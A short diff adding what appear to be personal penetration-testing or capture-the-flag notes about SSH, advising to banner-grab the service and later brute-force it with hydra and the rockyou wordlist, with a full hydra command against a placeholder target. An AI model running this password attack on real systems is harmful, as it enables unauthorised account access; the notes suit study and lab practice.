@@ -1,0 +1,5 @@
+simple, ignore ssh port until you need to use hydra for password 
+spray, make this the bottom of the list, but still banner grab. 
+You'll when to use it if you found users and use rockyou, unless 
+you find a hidden password list
+hydra -L (or l for one users)  -P /usr/share/wordlist/rockyou.txt ssh://$target -V -e nsr -f -t 50 -K 
